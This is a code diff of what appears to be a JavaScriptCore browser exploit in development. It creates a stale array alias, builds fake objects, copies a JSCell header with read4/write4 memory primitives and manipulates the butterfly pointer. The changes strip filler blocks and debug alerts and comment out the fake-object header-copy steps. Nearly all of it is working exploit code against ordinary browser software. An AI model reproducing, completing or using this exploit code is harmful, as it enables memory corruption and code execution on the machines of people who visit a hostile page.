@@ -162,64 +162,6 @@ function go_() {
 		var f1 = 0;
 		var x = [];
 	}
-	
-	if(document != document){
-		for(var i = 0; i < 5; i++){
-			var x=0;
-		}
-		var fx = {};
-		var f5 = 0;
-		var y = [];
-	}
-	if(document != document){
-		for(var i = 0; i < 5; i++){
-			var x=0;
-		}
-		var fx = {};
-		var f5 = 0;
-		var y = [];
-	}
-	if(document != document){
-		for(var i = 0; i < 5; i++){
-			var x=0;
-		}
-		var fx = {};
-		var f5 = 0;
-		var y = [];
-	}
-	if(document != document){
-		for(var i = 0; i < 5; i++){
-			var x=0;
-		}
-		var fp = {};
-		var f1 = 0;
-		var x = [];
-	}
-	
-	if(document != document){
-		for(var i = 0; i < 5; i++){
-			var x=0;
-		}
-		var fx = {};
-		var f5 = 0;
-		var y = [];
-	}
-	if(document != document){
-		for(var i = 0; i < 5; i++){
-			var x=0;
-		}
-		var fx = {};
-		var f5 = 0;
-		var y = [];
-	}
-	if(document != document){
-		for(var i = 0; i < 5; i++){
-			var x=0;
-		}
-		var fx = {};
-		var f5 = 0;
-		var y = [];
-	}
 
 	stale[0] += 0x101;
 
@@ -229,11 +171,11 @@ function go_() {
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
 				// Create fakeobj for fixing butterfly ptr
-				var fakeobj = {};
+				//var fakeobj = {};
 				
 				// leak fakeobj pointer
-				stale[0] = fakeobj;
-				var fop = bufs[i][k];
+				//stale[0] = fakeobj;
+				//var fop = bufs[i][k];
 				
 
 				stale[0] = {
@@ -245,7 +187,6 @@ function go_() {
 			
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
-				alert("Fored uint32array");
 				
 				/*
 				Array internals:
@@ -273,7 +214,6 @@ function go_() {
  				mem1 = bck;
  				mem2 = smsh;
  				bufs.push(stale)
-				alert("Got past main portion");
 				
 				/*
 				    1. Create an empty object. The structure of this object will describe
@@ -291,13 +231,13 @@ function go_() {
 				
 				// Copy the JSCell header:
 				// Write to the container object
-				write4((bufs[i][k] - 0x10), read4(fop)); // Low 32 bits of the JSCell Header
-				write4((bufs[i][k] - 0x10) + 4, read4(fop + 4)); // High 32 bits of the JSCell Header
-				fakeobj['a'] = 1; // Make _SURE_ fakeobj stays alive until this point
+				//write4((bufs[i][k] - 0x10), read4(fop)); // Low 32 bits of the JSCell Header
+				//write4((bufs[i][k] - 0x10) + 4, read4(fop + 4)); // High 32 bits of the JSCell Header
+				//fakeobj['a'] = 1; // Make _SURE_ fakeobj stays alive until this point
 
 				// Set the butterfly pointer of the fake array to nullptr
-				write4(bufs[i][k] + 0x08, 0);
-				write4(bufs[i][k] + 0x0C, 0);
+				//write4(bufs[i][k] + 0x08, 0);
+				//write4(bufs[i][k] + 0x0C, 0);
 				
 				
 				
